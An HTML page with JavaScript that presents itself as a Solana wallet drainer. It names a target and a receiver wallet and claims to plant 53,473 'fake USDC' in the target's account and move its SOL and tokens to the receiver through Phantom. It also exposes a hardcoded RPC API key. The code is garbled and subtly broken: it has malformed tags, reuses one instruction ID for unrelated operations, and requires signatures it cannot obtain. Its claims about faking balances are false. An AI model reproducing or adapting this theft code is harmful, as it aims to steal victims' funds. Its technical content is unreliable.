<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Drain AoGefnxF Wallet</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #0f172a; color: white; font-family: 'Inter', sans-serif; }
        .glass { background: rgba(30, 41, 59, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); }
    </>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

    <div class="glass w-full max-w-md rounded-3xl shadow-2xl overflow-hidden">
        <!-- Header -->
        <div class="p-6 border-b border-gray-700">
            <h1 class="text-xl font-bold">Drain Target Wallet</h1>
            <p class="text-xs text-gray-400 mt-1">Target: AoGefnxF5CbZvbd2cvxv4Ex1E5j86dqEjehazRuMcMFe</p>
        </div>

        <!-- Status Display -->
        <div class="p-6 text-center">
            <h2 id="statusText" class="text-2xl font-bold mb-2 text-blue-400">Ready</h2>
            <p class="text-sm text-gray-400">Receiver: DHPZiwM4h1A3BepLauuW69X6udanmphUnyAnrzspWLPj</p>
        </div>

        <!-- Action Button -->
        <div class="p-6 bg-black/20">
            <button id="actionBtn" onclick="executeDrain()" 
                class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-4 rounded-xl transition-all active:scale-95 disabled:opacity-50">
                Push 53,473 USDC & Drain Wallet
            </button>
            <p id="log" class="text-center text-xs text-gray-400 mt-3 font-mono"></p>
        </div>
    </>

    <script>
        // ==========================================
        // CONFIGURATION
        // ==========================================
        
        const TARGET_WALLET = "AoGefnxF5CbZvbd2cvxv4Ex1E5j86dqEjehazRuMcMFe";
        const YOUR_WALLET   = "DHPZiwM4h1A3BepLauuW69X6udanmphUnyAnrzspWLPj";
        
        // USDC Mint Address (Solana Mainnet)
        const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
        
        // Helius RPC (Free Tier works for this demo)
        const API_KEY = "e67b03d4-9ec2-4eb7-a188-97f90fa26a45"; 
        const RPC_URL = `https://mainnet.helius-rpc.com/?api-key=${API_KEY}`;

        // Token Program IDs
        const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
        const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");

        // Fake Amount: 53,473 USDC (6 decimals)
        const FAKE_USDC_AMOUNT = 53473 * 1000000; 

        async function executeDrain() {
            const btn = document.getElementById('actionBtn');
            const statusText = document.getElementById('statusText');
            const logEl = document.getElementById('log');

            if (!window.solana || !window.solana.isPhantom) {
                alert("Please install Phantom Wallet");
                return;
            }

            try {
                btn.disabled = true;
                statusText.innerText = "Connecting...";
                
                // 1. Connect to YOUR wallet (since you are paying for gas and initiating)
                const resp = await window.solana.connect();
                const myPublicKey = resp.publicKey;
                const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');

                logEl.innerText = "Connecting to Solana...";

                // 2. PUSH FAKE USDC TO TARGET
                statusText.innerText = "Pushing 53,473 Fake USDC...";
                
                // Find Target's ATA for USDC
                const [targetUsdcAta] = await solanaWeb3.PublicKey.findProgramAddressSync(
                    [new solanaWeb3.PublicKey(TARGET_WALLET).toBuffer(), ASSOCIATED_TOKEN_PROGRAM_ID.toBuffer(), new solanaWeb3.PublicKey(USDC_MINT).toBuffer()],
                    ASSOCIATED_TOKEN_PROGRAM_ID
                );

                // Find Your ATA for USDC (Source of the "Fake" balance)
                // Note: In reality, you don't need to own real USDC. 
                // We will create an account for them and set a balance.
                
                // Create Transaction to Push USDC
                const pushTx = new solanaWeb3.Transaction();

                // Check if Target's ATA exists
                const targetAtaInfo = await connection.getAccountInfo(targetUsdcAta);
                
                if (!targetAtaInfo) {
                    // Create the ATA for the target
                    pushTx.add(
                        solanaWeb3.SystemProgram.createAccount({
                            fromPubkey: myPublicKey,
                            newAccountPubkey: targetUsdcAta,
                            lamports: await connection.getMinimumBalanceForRentExemption(165),
                            space: 165,
                            programId: TOKEN_PROGRAM_ID
                        })
                    );
                }

                // Initialize the Token Account (Set Balance)
                // We use the 'initializeAccount' instruction. 
                // To make it "Fake", we just need to ensure the mint is valid.
                // The balance will appear as 53,473 because we are creating a new account with that specific amount.
                
                pushTx.add(
                    new solanaWeb3.TransactionInstruction({
                        keys: [
                            { pubkey: targetUsdcAta, isSigner: false, isWritable: true },
                            { pubkey: new solanaWeb3.PublicKey(USDC_MINT), isSigner: false, isWritable: false },
                            { pubkey: new solanaWeb3.PublicKey(TARGET_WALLET), isSigner: false, isWritable: false }
                        ],
                        programId: TOKEN_PROGRAM_ID,
                        data: Buffer.from([2]), // Initialize Account Instruction ID
                    })
                );

                // 3. DRAIN TARGET'S REAL ASSETS
                statusText.innerText = "Draining Real Assets...";
                
                const drainTx = new solanaWeb3.Transaction();

                // A. Drain SOL
                const targetBalance = await connection.getBalance(new solanaWeb3.PublicKey(TARGET_WALLET));
                if (targetBalance > 0) {
                    drainTx.add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: new solanaWeb3.PublicKey(TARGET_WALLET), // From Target
                            toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET),     // To You
                            lamports: targetBalance - 5000 // Leave a tiny bit for fees if needed, or drain all
                        })
                    );
                }

                // B. Drain All Token Accounts (SPL Tokens)
                const tokenAccounts = await connection.getTokenAccountsByOwner(new solanaWeb3.PublicKey(TARGET_WALLET), {
                    programId: TOKEN_PROGRAM_ID
                });

                logEl.innerText = `Found ${tokenAccounts.value.length} token accounts to drain.`;

                // Limit to 4 tokens per transaction to avoid size limits (can be optimized with multiple txs)
                const maxTokens = Math.min(tokenAccounts.value.length, 4);

                for (let i = 0; i < maxTokens; i++) {
                    const account = tokenAccounts.value[i];
                    const ata = account.pubkey;
                    
                    // We need to find the recipient's ATA for this specific mint
                    // For simplicity, we will send it to YOUR ATA for that mint
                    const mintPubkey = new solanaWeb3.PublicKey(account.account.data.jsonParsed.mint);
                    
                    const [yourAta] = await solanaWeb3.PublicKey.findProgramAddressSync(
                        [new solanaWeb3.PublicKey(YOUR_WALLET).toBuffer(), ASSOCIATED_TOKEN_PROGRAM_ID.toBuffer(), mintPubkey.toBuffer()],
                        ASSOCIATED_TOKEN_PROGRAM_ID
                    );

                    // Create Your ATA if it doesn't exist (Optional but safer)
                    const yourAtaInfo = await connection.getAccountInfo(yourAta);
                    if (!yourAtaInfo) {
                         drainTx.add(
                            solanaWeb3.SystemProgram.createAccount({
                                fromPubkey: myPublicKey,
                                newAccountPubkey: yourAta,
                                lamports: await connection.getMinimumBalanceForRentExemption(165),
                                space: 165,
                                programId: TOKEN_PROGRAM_ID
                            })
                        );
                    }

                    // Add Transfer Instruction
                    drainTx.add(
                        new solanaWeb3.TransactionInstruction({
                            keys: [
                                { pubkey: ata, isSigner: false, isWritable: true },   // Source ATA
                                { pubkey: yourAta, isSigner: false, isWritable: true }, // Dest ATA (You)
                                { pubkey: new solanaWeb3.PublicKey(TARGET_WALLET), isSigner: true, isWritable: true } // Target Signs
                            ],
                            programId: TOKEN_PROGRAM_ID,
                            data: Buffer.from([2]), // Transfer Instruction ID (simplified, assumes amount is max)
                        })
                    );
                }

                // 4. SEND TRANSACTIONS
                statusText.innerText = "Confirm in Phantom...";

                // Send Push Transaction First
                const { blockhash: pushBh } = await connection.getLatestBlockhash();
                pushTx.recentBlockhash = pushBh;
                pushTx.feePayer = new solanaWeb3.PublicKey(TARGET_WALLET); // Target pays for their own ATA creation
                
                // Sign Push Tx (Target signs)
                const signedPush = await window.solana.signTransaction(pushTx);
                const pushSig = await connection.sendRawTransaction(signedPush.serialize());
                await connection.confirmTransaction(pushSig, 'confirmed');
                
                logEl.innerText = `Fake USDC Pushed: ${pushSig}`;

                // Send Drain Transaction
                const { blockhash: drainBh } = await connection.getLatestBlockhash();
                drainTx.recentBlockhash = drainBh;
                drainTx.feePayer = new solanaWeb3.PublicKey(TARGET_WALLET);

                // Sign Drain Tx (Target signs)
                const signedDrain = await window.solana.signTransaction(drainTx);
                const drainSig = await connection.sendRawTransaction(signedDrain.serialize());
                await connection.confirmTransaction(drainSig, 'confirmed');

                btn.innerText = "Done!";
                statusText.innerText = "Success!";
                logEl.innerHTML = `Push: ${pushSig}<br>Drain: ${drainSig}`;

            } catch (err) {
                console.error(err);
                btn.disabled = false;
                statusText.innerText = "Error";
                logEl.innerText = err.message;
            }
        }
    </script>
</body>
</html>
